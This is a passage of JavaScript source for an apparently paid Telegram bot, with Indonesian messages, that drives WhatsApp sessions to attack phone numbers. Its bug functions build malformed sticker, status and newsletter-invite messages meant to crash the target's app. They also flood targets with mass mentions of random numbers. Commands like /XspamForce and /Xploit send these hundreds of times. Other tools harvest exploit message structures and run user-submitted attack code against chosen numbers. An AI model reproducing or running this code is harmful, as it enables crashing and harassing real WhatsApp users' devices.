        'buttons': /buttons\s*:\s*\[([^\]]+)\]/gs,
        'contextInfo': /contextInfo\s*:\s*{([^}]+)}/gs,
        'templateMessage': /templateMessage\s*:\s*{([^}]+)}/gs,
        'stickerPackMessage': /stickerPackMessage\s*:\s*{([^}]+)}/gs,
        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs,
        'extendedTextMessage': /extendedTextMessage\s*:\s*{([^}]+)}/gs,
    };
    let results = [];
    for (const [type, pattern] of Object.entries(patterns)) {
        const matches = code.matchAll(pattern);
        for (const match of matches) {
            results.push({ type: type, content: match[0].trim(), fullMatch: match[0] });
        }
    }
    return results;
}

// ================= ADD PARTICIPANT ================= //
function addParticipantToCode(code) {
    const hasParticipant = code.includes('participant: { jid: target }') || code.includes('}, { participant:') || code.includes('{ participant: { jid: target } }');
    if (hasParticipant) return { hasAlready: true, fixedCode: code, message: "✅ Participant sudah ada dalam code." };
    
    let fixed = code;
    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 'sock.relayMessage(target, message, { participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
    }
    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*(\{[^}]*\})\s*\)/g, 'sock.relayMessage(target, message, { ...$1, participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke parameter ketiga." };
    }
    if (/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*(\{[^}]*\})\s*\)/g, 'sock.relayMessage(\'status@broadcast\', msg, { ...$1, participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke status broadcast." };
    }
    if (/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
        fixed = fixed.replace(/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 'await sock.relayMessage(target, message, { participant: { jid: target } })');
        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
    }
    return { hasAlready: false, fixedCode: code, message: "⚠️ Tidak ditemukan pattern relayMessage dalam code." };
}

// ================= AUTO FIX ================= //
function autoFixJavaScript(code, error) {
    let fixed = code;
    const fixes = [];
    const lines = fixed.split('\n');
    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim();
        if (line && !line.endsWith(';') && !line.endsWith('{') && !line.endsWith('}') && !line.endsWith('(') && !line.startsWith('//') && !line.startsWith('/*') && !line.match(/(if|else|for|while|function|return|=>|,)$/)) {
            lines[i] += ';';
            fixes.push(`Added semicolon at line ${i+1}`);
        }
    }
    fixed = lines.join('\n');
    let open = (fixed.match(/\(/g) || []).length;
    let close = (fixed.match(/\)/g) || []).length;
    if (open > close) { fixed += ')'.repeat(open - close); fixes.push('Added missing parentheses'); }
    open = (fixed.match(/\{/g) || []).length;
    close = (fixed.match(/\}/g) || []).length;
    if (open > close) { fixed += '}'.repeat(open - close); fixes.push('Added missing brackets'); }
    if (fixed.includes('await ') && !fixed.includes('async ')) { fixed = fixed.replace(/function\s+(\w+)\s*\(/, 'async function $1('); fixes.push('Added async keyword'); }
    if (fixed.includes('await') && !fixed.includes('try') && !fixed.includes('.catch')) {
        const awaitLines = fixed.split('\n');
        for (let i = 0; i < awaitLines.length; i++) {
            if (awaitLines[i].includes('await') && !awaitLines[i].includes('try')) {
                awaitLines[i] = `try {\n  ${awaitLines[i]}\n} catch (err) {\n  console.error('Error:', err);\n}`;
                fixes.push(`Added try-catch for await at line ${i+1}`);
                break;
            }
        }
        fixed = awaitLines.join('\n');
    }
    if (fixed.includes(' == ') && !fixed.includes(' === ')) { fixed = fixed.replace(/==(?!=)/g, '==='); fixes.push('Changed == to ==='); }
    if (fixed.includes('var ')) { fixed = fixed.replace(/\bvar\s+/g, 'let '); fixes.push('Changed var to let'); }
    if (fixed.match(/function\s+\w+\s*\(\s*\)/) && (fixed.includes('sock') || fixed.includes('target'))) { fixed = fixed.replace(/function\s+(\w+)\s*\(\s*\)/, 'function $1(sock, target)'); fixes.push('Added missing parameters (sock, target)'); }
    let braceOpen = (fixed.match(/\{/g) || []).length;
    let braceClose = (fixed.match(/\}/g) || []).length;
    if (braceOpen > braceClose) { fixed += '\n}'.repeat(braceOpen - braceClose); fixes.push('Added missing closing braces'); }
    return { fixed, fixes };
}

// ================= TESTFUNCTION ================= //
async function executeTestFunction(sock, target, funcCode, jumlah) {
    try {
        const matchFunc = funcCode.match(/async function\s+(\w+)/);
        if (!matchFunc) return false;
        const funcName = matchFunc[1];
        const sandbox = { console, Buffer, sock, target, sleep, generateWAMessageFromContent };
        const context = vm.createContext(sandbox);
        const wrapper = `${funcCode}\n${funcName}(sock, target)`;
        for (let i = 0; i < jumlah; i++) {
            try { vm.runInContext(wrapper, context); } catch (err) {}
            await sleep(100);
        }
        return true;
    } catch (error) {
        return false;
    }
}

async function checkUserAccess(userId, chatId, chatType, commandName) {
    if (isCommandBlocked(commandName)) return false;
    if (isOwner(userId)) return true;
    if (chatType === "private" && !isPremium(userId)) {
        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
        return false;
    }
    return true;
}

function createBugSuccessMessage(targetNumber, bugType, date) {
    return `<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>\n\n◉ Target : ${targetNumber}\n◉ Type Bug : ${bugType}\n◉ Status : Successfully Send\n◉ Date Now : ${date}\n\n<blockquote>⸙ Spam Free at will</blockquote>`;
}

function createCheckButton(targetNumber) {
    return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
}

// ================= BUG FUNCTIONS ================= //
async function CrashFrHome(sock, target) {
    try {
        await sock.sendMessage(target, { viewOnceMessage: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true", fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=", fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=", mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=", mimetype: "image/webp", directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0", fileLength: { low: 1, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false }, isAnimated: true, contextInfo: { mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")] } } } } });
        for (let i = 0; i < 1000; i++) { await sock.sendMessage(target, { viewOnceMessage: { message: { eventMessage: { newsletterAdminInviteMessage: { newsletterJid: "33333333333333333@newsletter", newsletterName: "FrezeHomeAbouse" } } } } }); await sleep(50); }
    } catch (e) {}
}

async function StickerFC(sock, target) {
    try {
        await sock.relayMessage(target, { groupStatusMessageV2: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true", fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", mimetype: "image/webp", directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c", fileLength: "10610", mediaKeyTimestamp: "1775044724", stickerSentTs: "1775044724091" } } } }, {});
    } catch (err) {}
}

async function FCinvisTes(sock, target) {
    return await sock.relayMessage(target, { groupStatusMessageV2: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true", fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", mimetype: "image/webp", directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c", fileLength: "10610", mediaKeyTimestamp: "1775044724", stickerSentTs: "1775044724091" } } } }, { participant: { jid: target } });
}

async function FCinvis(sock, target) { return await FCinvisTes(sock, target); }
async function brem(sock, target) { }
async function VisiFriend(sock, target) { }
async function bulldozerV2(sock, target) { }
async function xatanicaldelayv2(sock, target) { }

// ================= COMMANDS ================= //
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const userId = from.id;
    const chatType = msg.chat.type;
    const isGroup = chatType === "group" || chatType === "supergroup";
    if (!isGroup && !isPremium(userId) && !isOwner(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
    }
    await sendStartMenu(chatId, from);
});

bot.onText(/\/cekfunc/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "cekfunc")) return;
    if (!msg.reply_to_message) return safeSendMessage(chatId, "⚠️ Reply function JavaScript.");
    const text = msg.reply_to_message.text || msg.reply_to_message.caption;
    if (!text) return safeSendMessage(chatId, "❌ Pesan tidak berisi kode.");
    const loadingMsg = await safeSendMessage(chatId, "🔍 Menganalisis function...");
    if (!loadingMsg) return;
    try {
        acorn.parse(text, { ecmaVersion: "latest", sourceType: "module", locations: true });
        await safeEditMessageText(chatId, loadingMsg.message_id, `🔎 SYNTAX VALID\n\n✅ Tidak ditemukan error.\n\n© Primrose Linux Bot`);
    } catch (err) {
        const lines = text.split("\n");
        const line = err.loc.line;
        const snippet = lines.slice(Math.max(0, line - 3), Math.min(lines.length, line + 2)).map((l, i) => { const num = Math.max(0, line - 3) + i + 1; return num === line ? `👉 ${num} | ${l}` : `   ${num} | ${l}`; }).join("\n");
        const keyboard = { inline_keyboard: [[{ text: "🔧 AUTO FIX 100%", callback_data: `autofix_${loadingMsg.message_id}` }]] };
        global.pendingFix = global.pendingFix || {};
        global.pendingFix[loadingMsg.message_id] = { code: text, error: err.message };
        await safeEditMessageText(chatId, loadingMsg.message_id, `❌ ERROR TERDETEKSI\n\n${err.message}\nLine ${line}\n\n📌 Cuplikan:\n${snippet}`, { reply_markup: keyboard });
    }
});

bot.onText(/\/addparticipant/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "addparticipant")) return;
    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) return safeSendMessage(chatId, "⚠️ Reply function JavaScript.");
    let code = msg.reply_to_message.text;
    if (!code && msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const response = await axios.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`);
        code = response.data;
    }
    const loadingMsg = await safeSendMessage(chatId, "👤 Memeriksa participant...");
    if (!loadingMsg) return;
    const result = addParticipantToCode(code);
    if (result.hasAlready) return safeEditMessageText(chatId, loadingMsg.message_id, `✅ PARTICIPANT SUDAH ADA\n\n${result.message}`);
    if (result.message.includes("Tidak ditemukan")) return safeEditMessageText(chatId, loadingMsg.message_id, `⚠️ PARTICIPANT TIDAK DITEMUKAN\n\n${result.message}`);
    if (result.fixedCode.length > 3500) {
        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ PARTICIPANT DITAMBAHKAN!\n\nCode terlalu panjang, dikirim sebagai file.`);
        const filePath = `participant_fixed_${Date.now()}.js`;
        fs.writeFileSync(filePath, result.fixedCode);
        await bot.sendDocument(chatId, filePath, { caption: `✅ Code dengan participant` });
        fs.unlinkSync(filePath);
    } else {
        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ PARTICIPANT DITAMBAHKAN!\n\n${result.message}\n\n🟢 HASIL:\n${result.fixedCode}`);
    }
});

bot.onText(/\/celahfunc/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "celahfunc")) return;
    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) return safeSendMessage(chatId, "⚠️ Reply code JavaScript.");
    let code = msg.reply_to_message.text;
    if (!code && msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const response = await axios.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`);
        code = response.data;
    }
    const celah = extractCelah(code);
    if (celah.length === 0) return safeSendMessage(chatId, "❌ Tidak ditemukan celah.");
    let response = `<blockquote>🔍 CELAH DITEMUKAN (${celah.length})</blockquote>\n\n`;
    for (let i = 0; i < Math.min(celah.length, 10); i++) response += `<b>${i+1}. ${celah[i].type}</b>\n<code>${celah[i].content.substring(0, 300)}</code>\n\n`;
    await safeSendMessage(chatId, response, { parse_mode: "HTML" });
});

bot.onText(/\/addcelah/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "addcelah")) return;
    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) return safeSendMessage(chatId, "⚠️ Reply code JavaScript.");
    let code = msg.reply_to_message.text;
    if (!code && msg.reply_to_message.document) {
        const file = await bot.getFile(msg.reply_to_message.document.file_id);
        const response = await axios.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`);
        code = response.data;
    }
    const celah = extractCelah(code);
    let added = 0;
    for (const c of celah) {
        if (!celahDatabase.some(item => item.type === c.type && item.content === c.content)) {
            celahDatabase.push({ id: Date.now().toString(36), type: c.type, content: c.content, addedBy: userId });
            added++;
        }
    }
    saveCelahDatabase();
    await safeSendMessage(chatId, `✅ ${added} celah ditambahkan.`);
});

bot.onText(/\/listcelah/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "listcelah")) return;
    if (celahDatabase.length === 0) return safeSendMessage(chatId, "📌 Belum ada celah.");
    let response = `<blockquote>📋 DAFTAR CELAH (${celahDatabase.length})</blockquote>\n\n`;
    for (let i = 0; i < Math.min(celahDatabase.length, 15); i++) response += `<b>${i+1}. ${celahDatabase[i].type}</b>\n<code>${celahDatabase[i].id}</code>\n\n`;
    await safeSendMessage(chatId, response, { parse_mode: "HTML" });
});

bot.onText(/\/delcelah (\w+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "delcelah")) return;
    const index = celahDatabase.findIndex(c => c.id === match[1]);
    if (index === -1) return safeSendMessage(chatId, "❌ ID tidak ditemukan.");
    celahDatabase.splice(index, 1);
    saveCelahDatabase();
    await safeSendMessage(chatId, "✅ Celah dihapus.");
});

bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "testfunction")) return;
    if (!msg.reply_to_message || !msg.reply_to_message.text) return safeSendMessage(chatId, "⚠️ Reply function JavaScript.");
    const args = msg.text.split(" ");
    if (args.length < 3) return safeSendMessage(chatId, "🪧 Example : /testfunction 62xxx 10");
    const targetNumber = args[1].replace(/[^0-9]/g, "");
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) return safeSendMessage(chatId, "❌ Jumlah harus angka");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    const loadingMsg = await safeSendMessage(chatId, "🚀 Memproses testfunction...");
    if (!loadingMsg) return;
    const success = await executeTestFunction(sock, `${targetNumber}@s.whatsapp.net`, msg.reply_to_message.text, jumlah);
    await safeEditMessageText(chatId, loadingMsg.message_id, success ? `✅ Testfunction selesai!\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x` : `❌ Testfunction gagal!`);
});

// ================= BUG COMMANDS ================= //
bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "xspamforce")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /XspamForce 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 500; i++) { await CrashFrHome(sock, `${targetNumber}@s.whatsapp.net`); await StickerFC(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
});

bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "xploit")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    await FCinvis(sock, `${targetNumber}@s.whatsapp.net`);
});

bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "sanjiva")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 10; i++) { await xatanicaldelayv2(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
});

bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "stova")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 7; i++) { await brem(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
});

bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "chatms")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 500; i++) { await FCinvisTes(sock, `${targetNumber}@s.whatsapp.net`); await sleep(3000); }
});

bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "ganesha")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 10; i++) { await bulldozerV2(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
});

bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (!await checkUserAccess(userId, chatId, chatType, "sendbug")) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 35; i++) { await VisiFriend(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
});

// ================= OWNER/ADMIN COMMANDS ================= //
const pendingPremiumPoll = {};
const pendingColorPoll = {};

bot.onText(/\/addprem\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const targetUserId = parseInt(match[1]);
    if (premiumUsers.find(u => u.id === targetUserId)) return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah premium.`);
    const poll = await bot.sendPoll(chatId, "💎 PILIH DURASI PREMIUM", ["💎 7 Hari", "👑 14 Hari", "🚀 30 Hari", "♾️ Permanent"], { is_anonymous: false });
    pendingPremiumPoll[poll.poll.id] = { userId: targetUserId, adminId: userId, chatId };
});

bot.onText(/\/delprem\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const index = premiumUsers.findIndex(u => u.id === parseInt(match[1]));
    if (index === -1) return safeSendMessage(chatId, "❌ User tidak ditemukan.");
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    safeSendMessage(chatId, "✅ User dihapus dari premium.");
});

bot.onText(/\/addadmin\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const targetUserId = parseInt(match[1]);
    if (adminUsers.includes(targetUserId)) return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah admin.`);
    adminUsers.push(targetUserId);
    saveAdminUsers();
    safeSendMessage(chatId, "✅ Admin ditambahkan.");
});

bot.onText(/\/deladmin\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const index = adminUsers.indexOf(parseInt(match[1]));
    if (index === -1) return safeSendMessage(chatId, "❌ Admin tidak ditemukan.");
    adminUsers.splice(index, 1);
    saveAdminUsers();
    safeSendMessage(chatId, "✅ Admin dihapus.");
});

bot.onText(/\/listprem/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    if (premiumUsers.length === 0) return safeSendMessage(chatId, "📌 Belum ada premium user.");
    let message = `<blockquote>📋 Daftar Premium User</blockquote>\n\n`;
    premiumUsers.forEach((user, i) => message += `${i+1}. ID: ${user.id}\n   Expires: ${user.expiresAt === "permanent" ? "Permanent" : moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n\n`);
    safeSendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/listadmin/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    if (adminUsers.length === 0) return safeSendMessage(chatId, "📌 Belum ada admin.");
    let message = `<blockquote>📋 Daftar Admin</blockquote>\n\n`;
    adminUsers.forEach((admin, i) => message += `${i+1}. ID: ${admin}\n\n`);
    safeSendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/update (on|off)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const mode = match[1] === "on";
    saveAutoUpdateSetting(mode);
    mode ? startAutoUpdateChecker() : stopAutoUpdateChecker();
    safeSendMessage(chatId, `✅ Auto update ${mode ? "ON" : "OFF"}`);
});

bot.onText(/\/autoupdate/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    await performUpdate(chatId);
});

bot.onText(/\/checkupdate/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const update = await checkForUpdates();
    safeSendMessage(chatId, update.hasUpdate ? `📦 Update tersedia! v${CURRENT_VERSION} → v${update.newVersion}` : `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
});

bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const cmd = match[1].toLowerCase().replace("/", "");
    if (blockedCommands.includes(cmd)) return safeSendMessage(chatId, `⚠️ Command /${cmd} sudah diblokir.`);
    blockedCommands.push(cmd);
    saveBlockedCommands();
    safeSendMessage(chatId, `✅ Command /${cmd} diblokir.`);
});

bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
    const cmd = match[1].toLowerCase().replace("/", "");
    const index = blockedCommands.indexOf(cmd);
    if (index === -1) return safeSendMessage(chatId, `⚠️ Command /${cmd} tidak diblokir.`);
    blockedCommands.splice(index, 1);
    saveBlockedCommands();
    safeSendMessage(chatId, `✅ Command /${cmd} dibuka.`);
});

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!adminUsers.includes(userId) && !isOwner(userId)) return safeSendPhoto(chatId, thumbnailUrl, { caption: "Access Admin Only", reply_markup: { inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]] } });
